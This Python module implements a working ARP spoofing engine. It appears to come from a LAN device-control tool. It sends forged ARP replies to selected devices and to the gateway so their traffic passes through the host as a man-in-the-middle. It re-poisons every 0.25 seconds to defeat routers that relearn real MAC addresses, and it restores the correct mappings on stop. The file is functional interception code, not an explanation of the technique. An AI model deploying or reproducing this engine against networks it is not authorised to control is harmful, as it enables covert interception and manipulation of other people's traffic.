"""
ARP spoofing engine. Poisons the ARP caches of INTERCEPTED targets (enforcement
∪ observation — see state.is_intercepted) and the gateway so their traffic is
routed through this machine (MITM position). Interception ≠ enforcement: a
monitored ALLOW device is poisoned here but the forwarder forwards it untouched.

One background thread re-sends poison packets on an interval for every
managed device. On stop, correct ARP mappings are restored.
"""
from __future__ import annotations

import threading
import time

from . import netinfo, arp, recovery, rawpkt
from .iobackend import make_injector
from ..state import STATE


class Spoofer:
    # Re-assert the poison aggressively (every 0.25 s). Some routers
    # (load-balancers, ones with hardware flow-offload / fast-forwarding, or
    # active ARP verification) relearn a client's real MAC within ~0.5 s of each
    # poison, so their DOWNLOAD traffic slips straight to the client and bypasses
    # our MITM. Re-poisoning ~2× inside that relearn window keeps interception
    # near-complete with margin. The cost is trivial — 2 tiny (~42-byte) ARP
    # frames per device per cycle, ~8 ARP pkt/s/device (a few KB/s even for many
    # devices) — no measurable CPU/RAM. Topology independent: no assumption about
    # WAN count or router model; harmless on simple routers.
    def __init__(self, interval: float = 0.25):
        self.interval = interval
        self._thread: threading.Thread | None = None
        self._stop = threading.Event()
        self._inj = None        # Injector backend (Gate 6.2: iobackend, Native default)
        self._gateway_mac: str | None = None
        self.iface: netinfo.Interface | None = None
        self._poisoned: dict[str, str] = {}   # ip -> mac currently poisoned

    # ---------- lifecycle ----------
    def start(self) -> None:
        if self._thread and self._thread.is_alive():
            return
        self.iface = STATE.interface
        if self.iface is None:
            raise RuntimeError("No interface selected")
        self._inj = make_injector(self.iface.name)
        self._gateway_mac = self._resolve(self.iface.gateway)
        if not self._gateway_mac:
            raise RuntimeError(f"Could not resolve gateway MAC ({self.iface.gateway})")
        self._stop.clear()
        self._thread = threading.Thread(target=self._loop, daemon=True)
        self._thread.start()
        STATE.enforcing = True

    def stop(self) -> None:
        self._stop.set()
        if self._thread:
            self._thread.join(timeout=3)
        self._restore_all()
        self._poisoned.clear()
        try:
            recovery.clear_active()
        except Exception:
            pass
        try:
            if self._inj:
                self._inj.close()
        except Exception:
            pass
        self._inj = None
        STATE.enforcing = False

    # ---------- helpers ----------
    def gateway_mac(self) -> str | None:
        return self._gateway_mac

    def _resolve(self, ip: str, tries: int = 3) -> str | None:
        return arp.arp_resolve(self.iface, ip, timeout=2.0, tries=tries)

    def _poison(self, target_ip: str, target_mac: str) -> None:
        my_mac = self.iface.mac
        gw_ip = self.iface.gateway
        # Tell target: "gateway is at my MAC"  (raw ARP, identical to scapy bytes)
        self._inj.send(rawpkt.build_arp(
            target_mac, my_mac, 2, my_mac, gw_ip, target_mac, target_ip))
        # Tell gateway: "target is at my MAC"
        self._inj.send(rawpkt.build_arp(
            self._gateway_mac, my_mac, 2, my_mac, target_ip, self._gateway_mac, gw_ip))

    def _restore(self, target_ip: str, target_mac: str, rounds: int = 5) -> None:
        gw_ip = self.iface.gateway
        for _ in range(rounds):
            try:
                # target: "gateway is really at gateway_mac"
                self._inj.send(rawpkt.build_arp(
                    target_mac, self._gateway_mac, 2,
                    self._gateway_mac, gw_ip, target_mac, target_ip))
                # gateway: "target is really at target_mac"
                self._inj.send(rawpkt.build_arp(
                    self._gateway_mac, target_mac, 2,
                    target_mac, target_ip, self._gateway_mac, gw_ip))
            except Exception:
                break
            time.sleep(0.2)

    def restore_device(self, ip: str) -> None:
        """Publicly restore a single device's ARP (e.g. rule set back to allow)."""
        if not self._inj:
            return
        dev = STATE.get(ip)
        if dev and dev.mac and not dev.is_self and not dev.is_gateway:
            self._restore(ip, dev.mac)

    def _restore_all(self) -> None:
        if not self._inj or not self.iface:
            return
        for dev in list(STATE.devices.values()):
            if dev.mac and not dev.is_self and not dev.is_gateway:
                self._restore(dev.ip, dev.mac)

    # ---------- main loop ----------
    def _loop(self) -> None:
        first = True
        # housekeeping (self-heal + crash-safe persist) runs ~every 2s regardless
        # of how fast we poison, so a tight poison interval adds no extra file I/O
        save_every = max(1, int(round(2.0 / self.interval)))
        tick = 0
        while not self._stop.is_set():
            # send a rapid burst on the first pass so MITM takes hold in ~1s
            rounds = 6 if first else 1
            targets = []
            for _ in range(rounds):
                targets = []
                for dev in STATE.intercepted():     # enforcement ∪ observation (P0)
                    if dev.mac and not dev.is_self and not dev.is_gateway:
                        targets.append({"ip": dev.ip, "mac": dev.mac})
                        try:
                            self._poison(dev.ip, dev.mac)
                        except Exception:
                            pass
                if rounds > 1:
                    self._stop.wait(0.15)
            first = False
            tick += 1
            if tick % save_every == 0:
                # self-heal: restore any device that just left the managed set so
                # a rule/block change never leaves a device poisoned-but-unforwarded
                self._heal_departed(targets)
                # persist active set for crash-safe restore
                try:
                    recovery.save_active(self.iface, self._gateway_mac, targets)
                except Exception:
                    pass
            self._stop.wait(self.interval)

    def _heal_departed(self, targets: list[dict]) -> None:
        current = {t["ip"]: t["mac"] for t in targets}
        for ip, mac in list(self._poisoned.items()):
            if ip not in current:
                try:
                    self._restore(ip, mac)
                except Exception:
                    pass
        self._poisoned = current


SPOOFER = Spoofer()
